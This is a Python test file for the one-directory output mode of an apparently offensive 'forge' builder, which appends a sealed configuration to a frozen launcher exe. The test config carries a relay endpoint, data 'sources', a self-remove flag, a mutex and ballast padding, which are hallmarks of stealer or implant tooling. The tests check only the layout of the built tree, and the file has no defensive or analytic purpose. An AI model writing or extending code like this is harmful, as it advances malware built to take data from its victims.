"""One-directory output: the tree is the artifact, and the exe inside it carries the tail.

A one-file build writes one exe and the loader reads the trailer from ``sys.executable``.
A one-directory build has the same exe with ``_internal`` beside it, and that difference
is not cosmetic: an exe from an onedir freeze copied somewhere on its own fails inside the
PyInstaller bootloader with "Failed to load Python DLL" before ``agent.loader`` is ever
imported. So ``forge.build(mode="dir")`` copies the tree and grows the exe that is already
in it, rather than writing a new file next to the launcher.

These tests use a synthetic tree — a few bytes under an ``.exe`` name — because the
property under test is the layout, not the boot. Booting is proved end to end by
``tools/probes/sable_launcher.py <tree>``, which reports 55/55 for both shapes.
"""

from __future__ import annotations

from pathlib import Path

import pytest

from core import forge
from core.schema import RelayConfig, RunConfig, SourceConfig


def _config(key: str = "k-dir-test-01", ballast: int = 0) -> RunConfig:
    return RunConfig(
        schema_version=1,
        mutex=r"Global\SABLE_DIR_TEST",
        seal_key=key,
        relay=RelayConfig(kind="https", endpoint="https://example.invalid/relay"),
        sources=SourceConfig(),
        self_remove=False,
        ballast_mb=ballast,
    )


def _tree(root: Path, *, exes: tuple[str, ...] = ("launcher.exe",), payload: bytes = b"MZ" + bytes(2048)) -> Path:
    root.mkdir(parents=True, exist_ok=True)
    for name in exes:
        (root / name).write_bytes(payload)
    internal = root / "_internal"
    internal.mkdir(parents=True, exist_ok=True)
    (internal / "python312.dll").write_bytes(b"MZ" + bytes(512))
    (internal / "base_library.zip").write_bytes(b"PK" + bytes(256))
    return root


def _sealed(cfg: RunConfig) -> bytes:
    """A blob long enough to pass the size gate. ``build`` does not open it."""
    del cfg
    return b"\x00" * forge.MIN_SEALED_BYTES


def test_dir_mode_writes_a_tree_not_a_file(tmp_path: Path) -> None:
    stub = _tree(tmp_path / "frozen")
    out = tmp_path / "shipped"

    forge.build(_config(), _sealed(_config()), out, mode=forge.OUTPUT_DIR, stub=stub)

    assert out.is_dir()
    assert (out / "_internal").is_dir()
    assert (out / "_internal" / "python312.dll").is_file()
    assert (out / "launcher.exe").is_file()


def test_dir_mode_grows_the_exe_inside_the_tree(tmp_path: Path) -> None:
    cfg = _config()
    stub = _tree(tmp_path / "frozen")
    stub_size = (stub / "launcher.exe").stat().st_size
    out = tmp_path / "shipped"

    forge.build(cfg, _sealed(cfg), out, mode=forge.OUTPUT_DIR, stub=stub)

    exe = out / "launcher.exe"
    grew = exe.stat().st_size - stub_size
    assert grew == len(_sealed(cfg)) + forge.TRAILER_SIZE + forge.FOOTER_SIZE

    raw = exe.read_bytes()
    assert raw[stub_size:stub_size + len(_sealed(cfg))] == _sealed(cfg)
    assert int.from_bytes(raw[-forge.FOOTER_SIZE:], "little") == forge.expected_offset(stub_size, 0)
    trailer = raw[-forge.FOOTER_SIZE - forge.TRAILER_SIZE : -forge.FOOTER_SIZE]
    assert trailer[: forge.KEY_SLOT].rstrip(b"\x00") == cfg.seal_key.encode()
    assert b"SBLK" not in raw[-forge.FOOTER_SIZE - forge.TRAILER_SIZE :]


def test_the_copied_tree_is_independent_of_the_stub(tmp_path: Path) -> None:
    """Editing the shipped tree must not reach back into the freeze it came from."""
    cfg = _config()
    stub = _tree(tmp_path / "frozen")
    out = tmp_path / "shipped"

    forge.build(cfg, _sealed(cfg), out, mode=forge.OUTPUT_DIR, stub=stub)
    (out / "_internal" / "python312.dll").unlink()

    assert (stub / "_internal" / "python312.dll").is_file()


def test_dir_mode_refuses_an_occupied_destination(tmp_path: Path) -> None:
    cfg = _config()
    stub = _tree(tmp_path / "frozen")
    out = _tree(tmp_path / "shipped")

    with pytest.raises(forge.ForgeError, match="already exists"):
        forge.build(cfg, _sealed(cfg), out, mode=forge.OUTPUT_DIR, stub=stub)


def test_dir_mode_refuses_a_single_file_as_the_stub(tmp_path: Path) -> None:
    cfg = _config()
    stub = _tree(tmp_path / "frozen") / "launcher.exe"

    with pytest.raises(forge.ForgeError, match="launcher tree"):
        forge.build(cfg, _sealed(cfg), tmp_path / "shipped", mode=forge.OUTPUT_DIR, stub=stub)


def test_sole_exe_refuses_a_tree_with_no_exe(tmp_path: Path) -> None:
    tree = _tree(tmp_path / "frozen", exes=())

    with pytest.raises(forge.ForgeError, match="found 0"):
        forge.sole_exe(tree)


def test_sole_exe_refuses_a_tree_with_two(tmp_path: Path) -> None:
    tree = _tree(tmp_path / "frozen", exes=("one.exe", "two.exe"))

    with pytest.raises(forge.ForgeError, match="found 2"):
        forge.sole_exe(tree)


def test_dir_mode_is_a_declared_output_mode() -> None:
    assert forge.OUTPUT_DIR in forge.OUTPUT_MODES
    assert forge.OUTPUT_DIR == "dir"


def test_dir_mode_needs_no_suffix(tmp_path: Path) -> None:
    """A tree is a folder, so the ``.exe`` suffix rule does not apply to it."""
    cfg = _config()
    stub = _tree(tmp_path / "frozen")
    out = tmp_path / "shipped.v1"

    forge.build(cfg, _sealed(cfg), out, mode=forge.OUTPUT_DIR, stub=stub)

    assert (out / "launcher.exe").is_file()
